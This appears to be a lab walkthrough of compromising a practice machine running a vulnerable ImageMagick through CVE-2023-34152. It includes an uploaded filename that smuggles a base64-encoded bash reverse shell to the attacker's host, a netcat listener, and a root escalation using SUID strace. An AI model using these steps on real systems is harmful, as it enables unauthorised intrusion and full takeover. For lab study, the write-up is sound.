`└─$ head nmapAutomator_192.168.231.178_all.txt -n 100`

`Running all scans on 192.168.231.178`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

Check out what's on port 80
If we upload a file, it shows Version: 6.9.6-4

![[Pasted image 20240217192852.png]]

If we do the usual Google with the version

![[Pasted image 20240217193737.png]]

I go through the exploits in the first result https://www.exploit-db.com/exploits/39767
None of them work though.

Start looking at the second result https://github.com/ImageMagick/ImageMagick/issues/6339
We start looking at [CVE-2016-5118](https://github.com/advisories/GHSA-6w95-mr48-gp8c "CVE-2016-5118").  
Can't get the PoCs we find for this to work but if we scroll down we in the Github page we find another CVE.
[CVE-2023-34152](https://github.com/advisories/GHSA-47q6-hqqr-mcr3 "CVE-2023-34152")

Google this and search for a PoC
![[Pasted image 20240217194232.png]]

https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152

We get this PoC and it works!

`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Image/ImageTragick_CVE-2023-34152]`
`└─$ python CVE-2023-34152.py -l 192.168.45.222 -p 4444

It makes our file
`└─$ ls -ltra`
`-rw-r--r-- 1 user user    9 Feb 17 17:49 '|en"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyMi80NDQ0IDA+JjEK'$'\n'' | base64 -d | bash".png'`

We setup our listener
`└─$ nc -nlvp 4444` 
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`

Upload the picture and catch the reverse shell
`Ncat: Connection from 192.168.231.178:35960.`
`bash: cannot set terminal process group (1156): Inappropriate ioctl for device`
`bash: no job control in this shell`
`www-data@image:/var/www/html$ whoami`
`whoami`

Look for applications where suid permission is set (ignore the garbage ones)
`find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|&/sys\|^/snap'

We find strace

GTFObins shows we can use this
![[Pasted image 20240217194633.png]]

`www-data@image:/var/www/html$ strace -o /dev/null /bin/sh -p`
`strace -o /dev/null /bin/sh -p`
`whoami`
`root`
`cat /root/proof.txt`
`90081f89927a935c9503d89b07bdc6f6`
